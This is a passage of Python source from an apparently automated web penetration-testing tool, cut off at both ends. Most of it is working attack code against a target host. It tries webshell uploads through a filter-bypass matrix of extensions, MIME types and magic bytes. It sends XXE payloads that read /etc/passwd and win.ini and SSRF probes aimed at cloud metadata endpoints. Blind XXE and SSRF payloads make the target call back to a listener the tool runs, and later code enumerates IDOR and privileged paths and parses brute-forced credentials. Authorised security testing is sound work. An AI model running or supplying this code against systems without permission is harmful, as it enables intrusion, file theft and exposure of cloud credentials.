        file_m = re.search(r"<input[^>]*type=[\"']?file[\"']?[^>]*name=[\"']([^\"']+)", form, re.I) or \
            re.search(r"<input[^>]*name=[\"']([^\"']+)[\"'][^>]*type=[\"']?file", form, re.I)
        if not file_m:
            continue
        act = re.search(r"action=[\"']([^\"']*)[\"']", fmt, re.I)
        method = re.search(r"method=[\"']?(\w+)", fmt, re.I)
        fields = {}
        for tag in re.findall(r"<input[^>]*>", form, re.I):
            tp = re.search(r"type=[\"']?(\w+)", tag, re.I)
            tp = tp.group(1).lower() if tp else "text"
            nm = re.search(r"name=[\"']([^\"']+)", tag, re.I)
            if not nm or tp == "file":
                continue
            nm = nm.group(1)
            vv = re.search(r"value=[\"']([^\"']*)", tag, re.I)
            if tp in ("hidden", "text", "email", "search", "url", "submit"):
                fields[nm] = vv.group(1) if vv else ("pshunter" if tp != "submit" else "1")
        return {"action": act.group(1) if act else "", "file": file_m.group(1),
                "method": (method.group(1).upper() if method else "POST"), "fields": fields}
    return None


def _gather_upload_targets(ip: str, port: int, proto: str) -> list:
    """(hostval, path) upload surfaces — dir-brute paths that look like an upload/profile page,
    plus common fallback paths, on the host and every discovered vhost."""
    tgts, seen = [], set()

    def _add(hostval, path):
        base = path.split("?")[0].split("#")[0]
        if not base.startswith("/"):
            return
        key = (hostval, base)
        if key not in seen:
            seen.add(key)
            tgts.append((hostval, base))

    for sid, output in fetch_scripts(ip, port, proto):
        if sid == "dir-brute":
            host = ip
            for ln in output.splitlines():
                mh = re.match(r"^\[([^\]\s]+)", ln)
                if mh:
                    host = mh.group(1)
                    continue
                mp = re.match(r"\s*[!+] \d{3}\s+(\S+)", ln)
                if mp and _UPLOAD_PATH_RE.search(mp.group(1)):
                    _add(host, mp.group(1))

    vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
    for h in [ip] + [v for v in vhosts if v != ip]:
        for p in _UPLOAD_FALLBACK_PATHS:
            _add(h, p)
    return tgts[:_UPLOAD_MAX_FORMS]


def _detect_web_langs(ip: str, port: int, proto: str) -> list:
    """Which server-side language(s) to target, inferred from the fingerprint (services +
    earlier http-* output): ASP/.NET on IIS, JSP on Tomcat/Java, PHP otherwise. Returns an
    ordered list — the detected stack first — so the upload tool auto-switches its payload."""
    blob = ""
    for (nm, prod, _ver, cpe) in fetch_services(ip).values():
        blob += " ".join(x for x in (nm, prod, cpe) if x).lower() + " "
    for sid, output in fetch_scripts(ip, port, proto):
        if sid in ("http-headers", "http-fingerprint", "http-source"):
            blob += " " + (output or "").lower()
    langs = []
    if re.search(r"asp\.net|microsoft-iis|\biis\b|x-aspnet|x-powered-by:\s*asp|\.aspx?\b", blob):
        langs.append("asp")
    if re.search(r"tomcat|coyote|\bjsp\b|jboss|jetty|wildfly|glassfish|servlet|\bjava\b", blob):
        langs.append("jsp")
    if re.search(r"\bphp\b|x-powered-by:\s*php|\.php\b", blob) or not langs:
        langs.append("php")                                   # default when nothing else matched
    return langs


def _upload_variants(lang: str, base: str, mark: str, a: int, b: int) -> list:
    """Extension / MIME / magic-byte bypass matrix for one language. The payload is inert — it
    echoes mark·(a*b)·mark so execution is provable by arithmetic. Each entry is
    (label, sent-filename, content-type, file-bytes, [names to fetch the stored file back])."""
    gif, png = b"GIF89a;\n", b"\x89PNG\r\n\x1a\n"
    if lang == "php":
        p = f"<?php echo '{mark}',{a}*{b},'{mark}'; ?>".encode()
        return [
            ("phtml",              f"{base}.phtml",   "image/jpeg",              p,       [f"{base}.phtml"]),
            ("php5",               f"{base}.php5",    "image/jpeg",              p,       [f"{base}.php5"]),
            ("pht",                f"{base}.pht",     "image/jpeg",              p,       [f"{base}.pht"]),
            ("phar",               f"{base}.phar",    "application/octet-stream", p,      [f"{base}.phar"]),
            ("php + image ctype",  f"{base}.php",     "image/png",               p,       [f"{base}.php"]),
            ("magic GIF89a .php",  f"{base}.php",     "image/gif",               gif + p, [f"{base}.php"]),
            ("magic PNG .phtml",   f"{base}.phtml",   "image/png",               png + p, [f"{base}.phtml"]),
            ("double .php.jpg",    f"{base}.php.jpg", "image/jpeg",              p,       [f"{base}.php.jpg", f"{base}.php"]),
            ("double .jpg.php",    f"{base}.jpg.php", "image/jpeg",              p,       [f"{base}.jpg.php"]),
            ("case .pHp",          f"{base}.pHp",     "image/jpeg",              p,       [f"{base}.pHp", f"{base}.php"]),
            ("trailing dot .php.", f"{base}.php.",    "image/jpeg",              p,       [f"{base}.php", f"{base}.php."]),
            ("nullbyte .php\\0.jpg", f"{base}.php\x00.jpg", "image/jpeg",        p,       [f"{base}.php"]),
        ]
    if lang == "asp":
        c = f'<%Response.Write("{mark}" & ({a}*{b}) & "{mark}")%>'.encode()               # classic ASP (VBScript)
        n = f'<%@ Page Language="C#"%><%Response.Write("{mark}"+({a}*{b})+"{mark}");%>'.encode()  # ASP.NET
        return [
            ("asp classic",       f"{base}.asp",      "image/jpeg", c,       [f"{base}.asp"]),
            ("asa",               f"{base}.asa",      "image/jpeg", c,       [f"{base}.asa"]),
            ("cer",               f"{base}.cer",      "image/jpeg", c,       [f"{base}.cer"]),
            ("asp;.jpg (IIS6)",   f"{base}.asp;.jpg", "image/jpeg", c,       [f"{base}.asp;.jpg", f"{base}.asp"]),
            ("magic GIF89a .asp", f"{base}.asp",      "image/gif",  gif + c, [f"{base}.asp"]),
            ("double .asp.jpg",   f"{base}.asp.jpg",  "image/jpeg", c,       [f"{base}.asp.jpg", f"{base}.asp"]),
            ("aspx .NET",         f"{base}.aspx",     "image/jpeg", n,       [f"{base}.aspx"]),
            ("aspx;.jpg",         f"{base}.aspx;.jpg", "image/jpeg", n,      [f"{base}.aspx;.jpg", f"{base}.aspx"]),
        ]
    if lang == "jsp":
        j = f'<% out.print("{mark}"+({a}*{b})+"{mark}"); %>'.encode()
        return [
            ("jsp",               f"{base}.jsp",      "image/jpeg", j,       [f"{base}.jsp"]),
            ("jspx",              f"{base}.jspx",     "image/jpeg", j,       [f"{base}.jspx"]),
            ("jsp;.jpg",          f"{base}.jsp;.jpg", "image/jpeg", j,       [f"{base}.jsp;.jpg", f"{base}.jsp"]),
            ("magic GIF89a .jsp", f"{base}.jsp",      "image/gif",  gif + j, [f"{base}.jsp"]),
            ("double .jsp.jpg",   f"{base}.jsp.jpg",  "image/jpeg", j,       [f"{base}.jsp.jpg", f"{base}.jsp"]),
        ]
    return []


def _multipart(fields: dict, file_field: str, filename: str, ctype: str, data: bytes) -> tuple:
    """Build a multipart/form-data body (bytes) + boundary from text fields and one file part."""
    boundary = "----pshunter" + "".join(random.choices("0123456789abcdef", k=16))
    out = b""
    for k, v in fields.items():
        out += (f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n"
                f"{v}\r\n").encode("utf-8", "replace")
    out += (f"--{boundary}\r\nContent-Disposition: form-data; name=\"{file_field}\"; "
            f"filename=\"{filename}\"\r\nContent-Type: {ctype}\r\n\r\n").encode("utf-8", "replace")
    out += data + f"\r\n--{boundary}--\r\n".encode()
    return out, boundary


def _tool_file_upload(ip: str, port: int, proto: str) -> str:
    """HTTP step-21 tool: attempt to upload a webshell through discovered upload forms, working
    an extension / MIME / magic-byte bypass matrix. The language auto-switches from the
    fingerprint — PHP by default, ASP/.NET on IIS, JSP on Tomcat/Java. The payload is INERT (it
    echoes a unique marker × arithmetic — no live command shell); the result is proven by
    fetching the stored file back and checking the arithmetic executed. RCE-confirmed vs
    merely-stored are reported separately, and every uploaded artifact is listed for manual
    removal. Stdlib only; a dead server raises. Authorised targets only — this writes files."""
    import http.client
    import ssl
    import time
    import urllib.parse

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _req(hostval, method, path, body=None, extra=None):
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_UPLOAD_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_UPLOAD_REQ_TIMEOUT)
            hdr = {"Host": hostval, "User-Agent": "pshunter"}
            if extra:
                hdr.update(extra)
            conn.request(method, path, body=body, headers=hdr)
            resp = conn.getresponse()
            data = resp.read(131072).decode("utf-8", "replace")
            setc = resp.headers.get_all("Set-Cookie") or []
            return resp.status, data, setc, resp.headers.get("Location")
        except Exception:                                     # noqa: BLE001
            return None, None, [], None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    if _req(ip, "GET", "/")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test upload")

    targets = _gather_upload_targets(ip, port, proto)
    langs = _detect_web_langs(ip, port, proto)
    deadline = time.time() + _UPLOAD_DEADLINE
    surfaces, rce, stored, artifacts = [], [], [], []
    tested = [0]

    def _verify(hostval, vpath, mark, product):
        """GET a stored file back → 'rce' if the arithmetic executed (mark·product·mark), 'stored'
        if our raw payload is served verbatim (upload worked, execution didn't), else None. The
        marker is unique per probe, so its mere presence is a reliable language-agnostic signal."""
        st, body, _sc, _loc = _req(hostval, "GET", vpath)
        if st is None or st == 404 or not body:
            return None
        if f"{mark}{product}{mark}" in body:
            return "rce"
        if mark in body:
            return "stored"
        return None

    def _locate(hostval, resp_body, names, mark, product):
        """Find where an accepted upload landed. Three strategies, cheapest first: (1) a URL the
        response leaks that carries one of the names we sent; (2) any other file URL the response
        leaks (the server renamed the upload) — safe to verify because our marker is unique;
        (3) a blind guess in the usual store dirs. Returns (url_path, 'rce'|'stored')/(None,None)."""
        for nm in names:
            m = re.search(r"((?:https?://[^\"'()<> ]+)?/[^\"'()<> ]*" + re.escape(nm) + r")",
                          resp_body or "")
            if m:
                pr = urllib.parse.urlparse(m.group(1))
                vpath = pr.path or m.group(1)
                v = _verify(hostval, vpath, mark, product)
                if v:
                    return vpath, v
        for cand in re.findall(r"(/[A-Za-z0-9_./-]+\.[A-Za-z0-9]{1,5})", resp_body or "")[:12]:
            v = _verify(hostval, cand, mark, product)
            tested[0] += 1
            if v:
                return cand, v
        for d in _UPLOAD_STORE_DIRS:
            if time.time() >= deadline:
                break
            for nm in names:
                v = _verify(hostval, d + nm, mark, product)
                tested[0] += 1
                if v:
                    return d + nm, v
        return None, None

    for hostval, path in targets:
        if time.time() >= deadline:
            break
        gs, gbody, gsc, _gl = _req(hostval, "GET", path)
        if gs is None:
            continue
        form = _parse_upload_form(gbody or "", path)
        if not form:
            continue
        surfaces.append(f"{hostval}{path} (field '{form['file']}')")
        action = urllib.parse.urljoin(f"{scheme}://{ip}:{port}{path}", form["action"] or path)
        pr = urllib.parse.urlparse(action)
        apath = pr.path + (f"?{pr.query}" if pr.query else "")
        cookie = "; ".join(c.split(";")[0] for c in gsc)
        rce_hit, stored_hit = False, False       # one RCE ends the form; one stored is enough to note
        for lang in langs:                       # auto-switch payload language per the fingerprint
            if rce_hit or time.time() >= deadline:
                break
            token = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8))
            base = "psh" + token
            mark = "PSHUP" + token
            a, b = random.randint(1000, 9999), random.randint(1000, 9999)
            product = str(a * b)
            for label, upname, ctype, data, names in _upload_variants(lang, base, mark, a, b):
                if time.time() >= deadline:
                    break
                body, boundary = _multipart(form["fields"], form["file"], upname, ctype, data)
                extra = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
                if cookie:
                    extra["Cookie"] = cookie
                st, rbody, _sc, _loc = _req(hostval, "POST", apath, body=body, extra=extra)
                tested[0] += 1
                if st is None:
                    continue
                accepted = st in (200, 201, 204, 301, 302, 303)
                vpath, verdict = _locate(hostval, rbody if accepted else "", names, mark, product)
                if verdict == "rce":
                    url = f"{scheme}://{hostval}:{port}{vpath}"
                    rce.append(f"  ✗ UPLOAD {url}  ({lang} · {label})  [via {hostval}{apath}]")
                    artifacts.append(f"{hostval}{vpath}")
                    rce_hit = True
                    break
                if verdict == "stored" and not stored_hit:
                    url = f"{scheme}://{hostval}:{port}{vpath}"
                    stored.append(f"  ⚠ UPLOAD {url}  ({lang} · {label}, exec unconfirmed)  [via {hostval}{apath}]")
                    artifacts.append(f"{hostval}{vpath}")
                    stored_hit = True
                    break                        # move to next language to seek an RCE
        if time.time() >= deadline:
            break

    reason = "deadline" if time.time() >= deadline else "complete"
    lines = [f"{scheme}://{ip}:{port}/ file-upload webshell ({'/'.join(langs)})",
             f"surfaces: {len(surfaces)} form · uploads tried {tested[0]} · "
             f"RCE {len(rce)} · stored {len(stored)} · {reason}"]
    if surfaces:
        lines.append("\nUPLOAD FORMS:")
        lines += [f"  {s}" for s in sorted(set(surfaces))]
    if rce:
        lines.append("\nRCE (code executed):")
        lines += rce
    if stored:
        lines.append("\nSTORED (upload accepted, execution unconfirmed):")
        lines += stored
    if artifacts:
        lines.append("\nartifacts to remove:")
        lines += [f"  {a}" for a in sorted(set(artifacts))]
    if not rce and not stored:
        lines.append("\nno upload bypass worked" if surfaces else "\nno upload form found")
    return "\n".join(lines)


# ── HTTP step 22: XXE & SSRF (read-only, in-band + out-of-band) ──
_XXES_DEADLINE = 300
_XXES_REQ_TIMEOUT = 8
_XXES_OOB_WAIT = 6              # s — one window after firing all blind probes of a phase
_XXES_MAX_TARGETS = 24         # per phase (SSRF combos / XML endpoints)
# query-param names that plausibly drive a server-side fetch (SSRF)
_SSRF_PARAMS = {
    "url", "uri", "link", "redirect", "redirect_url", "redirecturl", "next", "dest",
    "destination", "domain", "callback", "feed", "host", "target", "img", "image",
    "imageurl", "load", "src", "source", "proxy", "fetch", "webhook", "u", "page",
    "continue", "return", "returnurl", "out", "view", "site", "reference", "ref", "path",
}
_SSRF_CORE = ["url", "uri", "link", "redirect", "next", "dest", "image", "load",
              "feed", "callback", "target", "proxy"]      # injected on discovered endpoints
# cloud metadata endpoints: (label, url, markers that only appear in a real metadata response)
_SSRF_META = [
    ("aws",   "http://169.254.169.254/latest/meta-data/",
     ("ami-id", "instance-id", "security-credentials", "public-keys", "iam/")),
    ("gcp",   "http://metadata.google.internal/computeMetadata/v1/",
     ("computeMetadata", "project/", "instance/")),
    ("azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     ("azEnvironment", "vmId", "\"compute\"")),
]
# endpoints that classically parse XML / SOAP — POST an XML body here
_XXE_XML_PATHS = ["/xmlrpc.php", "/api", "/api/xml", "/soap", "/services", "/ws",
                  "/rest", "/rpc", "/graphql", "/feed", "/rss"]
# in-band XXE file-read probes: (xml body, detector regex, label)
_XXE_READ = [
    ('<?xml version="1.0" encoding="UTF-8"?>\n'
     '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<r>&xxe;</r>',
     re.compile(r"root:.*?:0:0:"), "file:///etc/passwd"),
    ('<?xml version="1.0" encoding="UTF-8"?>\n'
     '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>\n<r>&xxe;</r>',
     re.compile(r"\[(?:fonts|extensions|mci extensions)\]", re.I), "file:///c:/windows/win.ini"),
]


def _xxe_blind(url: str) -> str:
    """Blind-XXE body: a parameter entity whose SYSTEM id is our catcher URL. Resolving it makes
    the target fetch us — the fetch itself confirms outbound XML entity processing."""
    return ('<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY % e SYSTEM "'
            + url + '"> %e;]>\n<r>1</r>')


class _OOBCatcher:
    """Short-lived HTTP catcher for blind XXE / SSRF confirmation: binds an ephemeral port on
    every interface, hands out marker URLs, and records which markers the target actually
    fetched (proving an outbound request it made on our behalf). Read-only and benign — it just
    answers 200. .ok is False if our source IP or the socket could not be set up."""

    def __init__(self, target_ip: str):
        import socket
        import threading
        self.ok = False
        self.myip = None
        self.hits = {}                                       # marker -> (addr, full request path)
        self._lock = threading.Lock()
        try:
            u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            u.connect((target_ip, 9))
            self.myip = u.getsockname()[0]
            u.close()
        except Exception:                                    # noqa: BLE001
            return
        try:
            self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._srv.bind(("0.0.0.0", 0))
            self._srv.listen(16)
            self._srv.settimeout(1.0)
        except Exception:                                    # noqa: BLE001
            return
        self.port = self._srv.getsockname()[1]
        self._run = True
        self._th = threading.Thread(target=self._loop, daemon=True)
        self._th.start()
        self.ok = True

    def _loop(self):
        import socket
        while self._run:
            try:
                conn, addr = self._srv.accept()
            except socket.timeout:
                continue
            except Exception:                                # noqa: BLE001
                break
            try:
                data = conn.recv(4096).decode("latin-1", "replace")
                m = re.match(r"[A-Z]+ (/\S*)", data)
                if m:
                    full = m.group(1)
                    seg = full.strip("/").split("/")[0].split("?")[0]
                    with self._lock:
                        self.hits[seg] = (addr[0], full)
                conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
            except Exception:                                # noqa: BLE001
                pass
            finally:
                try:
                    conn.close()
                except Exception:                            # noqa: BLE001
                    pass

    def url(self, marker: str) -> str:
        return f"http://{self.myip}:{self.port}/{marker}"

    def seen(self, marker: str):
        with self._lock:
            return self.hits.get(marker)

    def close(self):
        self._run = False
        try:
            self._srv.close()
        except Exception:                                    # noqa: BLE001
            pass


def _gather_ssrf_targets(ip: str, port: int, proto: str) -> list:
    """(hostval, path, param) SSRF candidates: endpoints whose query already carries an SSRF-ish
    param (from http-source), then core SSRF params injected on discovered dynamic endpoints."""
    import urllib.parse
    out, seen = [], set()

    def _add(h, p, param):
        base = p.split("#")[0]
        if not base.startswith("/"):
            return
        k = (h, base, param)
        if k not in seen:
            seen.add(k)
            out.append((h, base, param))

    for sid, output in fetch_scripts(ip, port, proto):
        if sid == "http-source":
            for m in re.findall(r"https?://[^\s\"'<>]+\?[^\s\"'<>]+", output or ""):
                pr = urllib.parse.urlparse(m)
                for k, _v in urllib.parse.parse_qsl(pr.query):
                    if k.lower() in _SSRF_PARAMS:
                        _add(ip, pr.path + "?" + pr.query, k)

    endpoints = _gather_param_endpoints(ip, port, proto)
    for param in _SSRF_CORE:                                  # param-major → cover many endpoints
        for host, path in endpoints:
            _add(host, path, param)
    return out[:_XXES_MAX_TARGETS]


def _gather_xml_endpoints(ip: str, port: int, proto: str) -> list:
    """(hostval, path) endpoints that plausibly parse XML — classic SOAP/RPC/API paths on the
    host + vhosts, plus any api/soap/xml/rpc-looking path mined by dir-brute / http-source."""
    out, seen = [], set()

    def _add(h, p):
        base = p.split("?")[0].split("#")[0]
        if not base.startswith("/"):
            return
        if (h, base) not in seen:
            seen.add((h, base))
            out.append((h, base))

    vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
    for h in [ip] + [v for v in vhosts if v != ip]:
        for p in _XXE_XML_PATHS:
            _add(h, p)
    for sid, output in fetch_scripts(ip, port, proto):
        if sid in ("dir-brute", "http-source"):
            host = ip
            for ln in (output or "").splitlines():
                mh = re.match(r"^\[([^\]\s]+)", ln)
                if mh:
                    host = mh.group(1)
                    continue
                for m in re.findall(
                        r"(/[A-Za-z0-9_./-]*(?:api|soap|xml|rpc|ws|rest|feed|rss|graphql)"
                        r"[A-Za-z0-9_./-]*)", ln, re.I):
                    _add(host if sid == "dir-brute" else ip, m)
    return out[:_XXES_MAX_TARGETS]


def _tool_xxe_ssrf(ip: str, port: int, proto: str) -> str:
    """HTTP step-22 tool: probe for SSRF and XXE, read-only. SSRF: point fetch-style params at a
    short-lived listener we control (out-of-band, definitive) and at cloud-metadata endpoints
    (in-band). XXE: POST XML with an external entity reading /etc/passwd or win.ini (in-band file
    read) and a parameter entity pointing at our listener (blind, OOB). Nothing is written to the
    target. Stdlib only; a dead server raises. OOB needs the target to reach us back (egress)."""
    import http.client
    import ssl
    import time
    import urllib.parse

    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
    scheme = "https" if tls else "http"
    ctx = ssl._create_unverified_context()

    def _req(hostval, method, path, body=None, ctype=None, extra=None):
        conn = None
        try:
            if tls:
                conn = http.client.HTTPSConnection(ip, port, timeout=_XXES_REQ_TIMEOUT, context=ctx)
            else:
                conn = http.client.HTTPConnection(ip, port, timeout=_XXES_REQ_TIMEOUT)
            hdr = {"Host": hostval, "User-Agent": "pshunter"}
            if ctype:
                hdr["Content-Type"] = ctype
            if extra:
                hdr.update(extra)
            conn.request(method, path, body=body, headers=hdr)
            resp = conn.getresponse()
            return resp.status, resp.read(131072).decode("utf-8", "replace")
        except Exception:                                     # noqa: BLE001
            return None, None
        finally:
            if conn is not None:
                try:
                    conn.close()
                except Exception:                             # noqa: BLE001
                    pass

    def _set_param(path, param, value):
        pr = urllib.parse.urlparse(path)
        pairs = [(k, v) for k, v in urllib.parse.parse_qsl(pr.query) if k != param]
        pairs.append((param, value))
        return pr.path + "?" + urllib.parse.urlencode(pairs)

    def _rnd():
        return "pshoob" + "".join(random.choices("0123456789abcdef", k=10))

    if _req(ip, "GET", "/")[0] is None:
        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test XXE/SSRF")

    deadline = time.time() + _XXES_DEADLINE
    catcher = _OOBCatcher(ip)
    ssrf_meta, ssrf_oob, xxe_read, xxe_oob = [], [], [], []
    ssrf_surf, xml_surf = set(), set()

    # ── SSRF phase ──
    ssrf_oob_map = {}
    for hostval, path, param in _gather_ssrf_targets(ip, port, proto):
        if time.time() >= deadline:
            break
        ssrf_surf.add(f"{hostval}{path.split('?')[0]}?{param}=")
        meta_hit = False
        for label, murl, markers in _SSRF_META:
            st, body = _req(hostval, "GET", _set_param(path, param, murl))
            if st is not None and body and any(tok in body for tok in markers):
                ssrf_meta.append(f"  ✗ SSRF-META {hostval}{path.split('?')[0]}?{param}  "
                                 f"({label} metadata reachable)")
                meta_hit = True
                break
        if not meta_hit and catcher.ok:
            marker = _rnd()
            ssrf_oob_map[marker] = (hostval, path, param)
            _req(hostval, "GET", _set_param(path, param, catcher.url(marker)))
    if catcher.ok and ssrf_oob_map and time.time() < deadline:
        time.sleep(_XXES_OOB_WAIT)
        for marker, (hostval, path, param) in ssrf_oob_map.items():
            if catcher.seen(marker):
                ssrf_oob.append(f"  ✗ SSRF-OOB {hostval}{path.split('?')[0]}?{param}  "
                                f"(target fetched our listener)")

    # ── XXE phase ──
    xxe_oob_map = {}
    for hostval, path in _gather_xml_endpoints(ip, port, proto):
        if time.time() >= deadline:
            break
        read_hit = False
        for xml, detector, label in _XXE_READ:
            st, body = _req(hostval, "POST", path, body=xml, ctype="application/xml")
            if st is not None and body and detector.search(body):
                xxe_read.append(f"  ✗ XXE-READ {hostval}{path}  ({label})")
                read_hit = True
                break
            if st is not None and body and re.search(r"xml|entity|DOCTYPE|SOAP-ENV|not well-formed",
                                                     body, re.I):
                xml_surf.add(f"{hostval}{path}")
        if not read_hit and catcher.ok:
            marker = _rnd()
            xxe_oob_map[marker] = (hostval, path)
            _req(hostval, "POST", path, body=_xxe_blind(catcher.url(marker)),
                 ctype="application/xml")
    if catcher.ok and xxe_oob_map and time.time() < deadline:
        time.sleep(_XXES_OOB_WAIT)
        for marker, (hostval, path) in xxe_oob_map.items():
            if catcher.seen(marker):
                xxe_oob.append(f"  ✗ XXE-OOB {hostval}{path}  (target fetched our listener)")

    catcher.close()

    oob_note = "" if catcher.ok else "  (OOB listener unavailable — in-band checks only)"
    reason = "deadline" if time.time() >= deadline else "complete"
    lines = [f"{scheme}://{ip}:{port}/ XXE & SSRF probe{oob_note}",
             f"ssrf surfaces: {len(ssrf_surf)} · xml endpoints: {len(xml_surf) or 0} · "
             f"SSRF[meta {len(ssrf_meta)} · oob {len(ssrf_oob)}] · "
             f"XXE[read {len(xxe_read)} · oob {len(xxe_oob)}] · {reason}"]
    if ssrf_meta:
        lines.append("\nSSRF → cloud metadata:")
        lines += ssrf_meta
    if ssrf_oob:
        lines.append("\nSSRF (out-of-band confirmed):")
        lines += ssrf_oob
    if xxe_read:
        lines.append("\nXXE file read:")
        lines += xxe_read
    if xxe_oob:
        lines.append("\nXXE (out-of-band confirmed):")
        lines += xxe_oob
    if xml_surf and not xxe_read and not xxe_oob:
        lines.append("\nXML-parsing endpoints (no XXE confirmed):")
        lines += [f"  {s}" for s in sorted(xml_surf)]
    if not (ssrf_meta or ssrf_oob or xxe_read or xxe_oob):
        lines.append("\nno XXE/SSRF confirmed")
    return "\n".join(lines)


# ── HTTP step 23: IDOR / broken access control (read-only, unauth + optional creds) ──
_IDOR_DEADLINE = 240
_IDOR_REQ_TIMEOUT = 8
_IDOR_MAX_ENDPOINTS = 20        # ID-bearing endpoints to enumerate
_IDOR_MAX_PRIV = 24            # privileged paths to force-browse / bypass
_IDOR_ID_PARAMS = {
    "id", "uid", "user", "userid", "user_id", "account", "acct", "order", "orderid",
    "doc", "docid", "document", "file", "fileid", "invoice", "pid", "record", "rid",
    "num", "no", "key", "ref", "item", "ticket", "pk", "msg", "message",
}
_PRIV_PATH_RE = re.compile(
    r"admin|dashboard|manage|console|users?|account|api|internal|config|report|billing|"
    r"invoice|setting|profile|panel|staff|moderator", re.I)
_PRIV_CONTENT_RE = re.compile(
    r"logout|log ?out|dashboard|administration|manage users|delete\b|\brole\b|privilege|"
    r"add user|user list|<table|control panel|settings", re.I)
_PII_RE = re.compile(
    r"[\w.+-]+@[\w-]+\.[\w.-]+|"                              # email
    r"[\"']?(?:user_?name|email|first_?name|last_?name|phone|address|ssn|balance|role|"
    r"is_?admin|api[_-]?key|token|password)[\"']?\s*[:=]", re.I)
_IDOR_FALLBACK = ["/user/1", "/users/1", "/api/users/1", "/api/user/1", "/account/1",
                  "/accounts/1", "/profile/1", "/order/1", "/orders/1", "/invoice/1",
                  "/api/v1/users/1", "/?id=1"]
_PRIV_FALLBACK = ["/admin", "/admin/users", "/administrator", "/dashboard", "/manage",
                  "/management", "/settings", "/config", "/api/users", "/api/admin",
                  "/users", "/staff", "/panel", "/console"]


def _gather_priv_paths(ip: str, port: int, proto: str) -> list:
    """(hostval, path, status) privileged surfaces to force-browse: dir-brute hits that returned
    401/403 or look admin-ish, plus a fallback list, on the host and every vhost."""
    out, seen = [], set()

    def _add(host, path, status):
        base = path.split("?")[0].split("#")[0]
        if not base.startswith("/"):
            return
        if (host, base) not in seen:
            seen.add((host, base))
            out.append((host, base, status))

    for sid, output in fetch_scripts(ip, port, proto):
        if sid == "dir-brute":
            host = ip
            for ln in (output or "").splitlines():
                mh = re.match(r"^\[([^\]\s]+)", ln)
                if mh:
                    host = mh.group(1)
                    continue
                mp = re.match(r"\s*[!+] (\d{3})\s+(\S+)", ln)
                if mp and (int(mp.group(1)) in (401, 403) or _PRIV_PATH_RE.search(mp.group(2))):
                    _add(host, mp.group(2), int(mp.group(1)))

    vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
    for h in [ip] + [v for v in vhosts if v != ip]:
        for p in _PRIV_FALLBACK:
            _add(h, p, None)
    return out[:_IDOR_MAX_PRIV]


def _gather_id_endpoints(ip: str, port: int, proto: str) -> list:
    """ID-bearing endpoints to enumerate. Each entry is either
    ('param', host, path, param, id_int, label) or ('path', host, prefix, suffix, id_int, label)."""
    import urllib.parse
    out, seen = [], set()

    def _add(host, path):
        base = path.split("#")[0]
        if not base.startswith("/"):
            return
        pr = urllib.parse.urlparse(base)
        for k, v in urllib.parse.parse_qsl(pr.query):        # a numeric ID-ish query param
            if k.lower() in _IDOR_ID_PARAMS and v.isdigit():
                key = (host, pr.path, "param", k)
                if key not in seen:
                    seen.add(key)
                    out.append(("param", host, base, k, int(v), f"{pr.path}?{k}={{id}}"))
                return
        m = re.search(r"(\d+)(?!.*\d)", pr.path)             # else a trailing path integer
        if m:
            key = (host, pr.path, "path", m.start())
            if key not in seen:
                seen.add(key)
                pre, suf = pr.path[:m.start()], pr.path[m.end():]
                out.append(("path", host, pre, suf, int(m.group(1)), f"{pre}{{id}}{suf}"))

    for host, path in _gather_param_endpoints(ip, port, proto):
        _add(host, path)
    for sid, output in fetch_scripts(ip, port, proto):
        if sid == "dir-brute":
            host = ip
            for ln in (output or "").splitlines():
                mh = re.match(r"^\[([^\]\s]+)", ln)
                if mh:
                    host = mh.group(1)
                    continue
                mp = re.match(r"\s*[!+] \d{3}\s+(\S+)", ln)
                if mp:
                    _add(host, mp.group(1))
        elif sid == "http-source":
            for m in re.findall(r"https?://[^\s\"'<>]+", output or ""):
                pr = urllib.parse.urlparse(m)
                _add(ip, pr.path + (f"?{pr.query}" if pr.query else ""))

    if not out:                                              # nothing discovered → sensible guesses
        vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
        for h in [ip] + [v for v in vhosts if v != ip]:
            for p in _IDOR_FALLBACK:
                _add(h, p)
    return out[:_IDOR_MAX_ENDPOINTS]


def _parse_valid_creds(ip: str, port: int, proto: str) -> list:
    """(hostval, path, kind, user, pass) valid credentials harvested earlier by default-creds
    (`! user:pass @ /path (form) [host]`) or login-brute (`✗ CRACKED user:pass @ /path (form)`
    under a `[host]` section)."""
    out = []
    for sid, output in fetch_scripts(ip, port, proto):
        if sid == "default-creds":
            for m in re.finditer(
                    r"! (\S+):(\S+) @ (\S+) \((Basic|form)\) \[([^\]]+)\]", output or ""):
                pw = "" if m.group(2) == "<blank>" else m.group(2)
                out.append((m.group(5), m.group(3), m.group(4), m.group(1), pw))
        elif sid == "login-brute":
            host = ip
            for ln in (output or "").splitlines():
                mh = re.match(r"^\[([^\]\s]+)", ln)
                if mh:
                    host = mh.group(1)
                    continue
                mc = re.match(r"\s*✗ CRACKED (\S+):(\S+) @ (\S+) \(([^)]+)\)", ln)
                if mc:
